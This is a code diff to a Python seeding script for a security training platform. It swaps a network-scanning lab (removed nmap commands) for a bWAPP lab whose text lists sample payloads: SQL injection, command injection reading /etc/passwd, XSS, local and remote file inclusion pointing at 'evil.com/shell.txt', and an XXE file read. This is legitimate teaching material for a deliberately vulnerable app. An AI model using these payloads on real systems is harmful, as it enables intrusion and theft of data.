@@ -96,147 +96,110 @@ Access the Score Board at `/score-board` to track your progress!
 """
         }
 
-        # Lab 2: Network Reconnaissance & Enumeration
-        network_recon_lab = {
-            "title": "Network Reconnaissance & Enumeration",
-            "description": "Master network scanning and service enumeration techniques. Discover hosts, identify services, and map network topology using professional tools.",
-            "docker_image": "kalilinux/kali-rolling",
+        # Lab 2: bWAPP - Buggy Web Application
+        bwapp_lab = {
+            "title": "bWAPP Security Exploitation",
+            "description": "Practice over 100 web vulnerabilities in bWAPP (Buggy Web Application). Covers OWASP Top 10, injection flaws, and more with guided exercises.",
+            "docker_image": "raesene/bwapp:latest",
             "difficulty": LabDifficulty.INTERMEDIATE,
-            "category": "Network Security",
+            "category": "Web Security",
             "estimated_minutes": 75,
-            "lab_type": LabType.GUACAMOLE,
-            "guacamole_url": "http://localhost:8085/guacamole",
+            "lab_type": LabType.GUACAMOLE,  # Using guacamole type for browser-based labs
+            "guacamole_url": "http://localhost:8088",  # Direct bWAPP URL
             "compose_file": os.path.abspath(os.path.join(
                 os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 
-                "docker", "pentest-lab", "docker-compose.yml"
+                "docker", "bwapp", "docker-compose.yml"
             )),
             "content": """
-# Network Reconnaissance & Enumeration
+# bWAPP Security Exploitation
 
 ## Introduction
-Network reconnaissance is the foundation of penetration testing. This lab teaches you to discover and analyze network targets using professional tools.
+bWAPP (Buggy Web Application) is a deliberately insecure web application with over **100 vulnerabilities**. It covers all OWASP Top 10 risks and more.
 
-## Environment
-- **Kali Linux** - Attack machine via VNC
-- **Target Network** - 172.28.0.0/16
-  - pentest_dvwa (Web Server)
-  - pentest_juice_shop (Node.js App)
-  - pentest_vulnerable_ssh (SSH Server)
-  - pentest_dvwa_db (MySQL Database)
+## Getting Started
+1. After starting the lab, bWAPP opens in a new tab
+2. Login with: **bee** / **bug**
+3. Click **"here"** to install the database (first time only)
+4. Select a vulnerability from the dropdown and click **Hack**
 
-## Access via Guacamole
-Login: `tygr` / `tygrsec123` → Click "Kali Attack Machine"
+## Vulnerability Categories
 
-## Exercises
-
-### Exercise 1: Host Discovery
-Find all live hosts on the network:
-
-```bash
-# Ping scan (fast)
-nmap -sn 172.28.0.0/24
-
-# ARP scan (more reliable in local networks)
-nmap -PR 172.28.0.0/24
+### 1. SQL Injection ⭐⭐
+**Location:** SQL Injection (GET/Search)
+```sql
+-- Try in the search field:
+' OR '1'='1
+' UNION SELECT 1,user(),3,4,5,6,7--
 ```
 
-**Expected Result:** 5-6 hosts discovered
-
-### Exercise 2: Port Scanning
-Identify open ports on discovered hosts:
-
+### 2. Command Injection ⭐⭐
+**Location:** OS Command Injection
 ```bash
-# Quick scan (top 1000 ports)
-nmap 172.28.0.0/24
-
-# Full port scan (all 65535 ports)
-nmap -p- pentest_dvwa
-
-# Specific port range
-nmap -p 1-1000,3000,3306 172.28.0.0/24
+# Try after the IP address:
+; cat /etc/passwd
+| whoami
+`whoami`
 ```
 
-### Exercise 3: Service Version Detection
-Identify software versions running on open ports:
-
-```bash
-# Service version detection
-nmap -sV pentest_dvwa pentest_juice_shop pentest_vulnerable_ssh
-
-# Aggressive scan (includes OS detection)
-nmap -A pentest_dvwa
+### 3. XSS Reflected ⭐
+**Location:** XSS - Reflected (GET)
+```html
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
 ```
 
-**Document the versions found:**
-- What web server is DVWA running?
-- What version of SSH is vulnerable-ssh running?
-
-### Exercise 4: OS Detection
-Fingerprint the operating systems:
-
-```bash
-nmap -O pentest_dvwa
-nmap -O --osscan-guess 172.28.0.0/24
+### 4. XSS Stored ⭐⭐
+**Location:** XSS - Stored (Blog)
+```html
+<script>alert(document.cookie)</script>
 ```
 
-### Exercise 5: Script Scanning
-Use Nmap scripts for deeper enumeration:
+### 5. File Inclusion ⭐⭐⭐
+**Location:** Remote & Local File Inclusion
+```
+# Local File Inclusion:
+?language=../../../etc/passwd
 
-```bash
-# Default scripts
-nmap -sC pentest_dvwa
-
-# HTTP enumeration
-nmap --script http-enum pentest_dvwa
-
-# SSH enumeration
-nmap --script ssh-auth-methods pentest_vulnerable_ssh
-
-# Vulnerability scan
-nmap --script vuln pentest_dvwa
+# Remote File Inclusion:
+?language=http://evil.com/shell.txt
 ```
 
-### Exercise 6: Create a Network Map
-Document your findings:
+### 6. Insecure Direct Object Reference ⭐
+**Location:** Insecure DOR (Order Tickets)
+- Change ticket ID in URL to access other orders
 
-| Host | IP | Open Ports | Services |
-|------|-----|------------|----------|
-| DVWA | ? | ? | ? |
-| Juice Shop | ? | ? | ? |
-| SSH Server | ? | ? | ? |
-| Database | ? | ? | ? |
-
-## Advanced Techniques
-
-### Stealth Scanning
-```bash
-# SYN scan (stealthier)
-nmap -sS pentest_dvwa
-
-# Timing control (slower = stealthier)
-nmap -T2 pentest_dvwa
+### 7. XML External Entity (XXE) ⭐⭐⭐
+**Location:** XML External Entity Attacks
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<reset><login>&xxe;</login></reset>
 ```
 
-### Save Results
-```bash
-# Output to all formats
-nmap -oA scan_results 172.28.0.0/24
+## Security Levels
+bWAPP has 3 security levels:
+- **Low** - No protection (learning)
+- **Medium** - Some filtering
+- **High** - Strong protection
 
-# XML output for tools
-nmap -oX results.xml 172.28.0.0/24
-```
+Start with **Low** and work your way up!
 
-## Summary
-By completing this lab, you should be able to:
-- ✅ Discover live hosts on a network
-- ✅ Identify open ports and services
-- ✅ Determine software versions
-- ✅ Document network topology
+## Tools to Use
+- **Browser DevTools** (F12) - Inspect requests
+- **Burp Suite** - Intercept and modify traffic
+- **SQLMap** - Automated SQL injection
+- **curl** - Command-line requests
+
+## Default Credentials
+- Username: `bee`
+- Password: `bug`
+
+> **Tip:** Change the security level in the dropdown to practice bypassing filters!
 """
         }
 
         # Insert/Update labs
-        for lab_data in [juice_shop_lab, network_recon_lab]:
+        for lab_data in [juice_shop_lab, bwapp_lab]:
             existing = db.query(Lab).filter(Lab.title == lab_data["title"]).first()
             if existing:
                 print(f"Updating: {existing.title}")
@@ -249,9 +212,9 @@ By completing this lab, you should be able to:
         
         db.commit()
         print("\n✅ Intermediate labs seeded successfully!")
-        print("\nNew labs added:")
+        print("\nLabs added/updated:")
         print("  1. OWASP Juice Shop Challenges")
-        print("  2. Network Reconnaissance & Enumeration")
+        print("  2. bWAPP Security Exploitation")
 
     except Exception as e:
         print(f"Error: {e}")
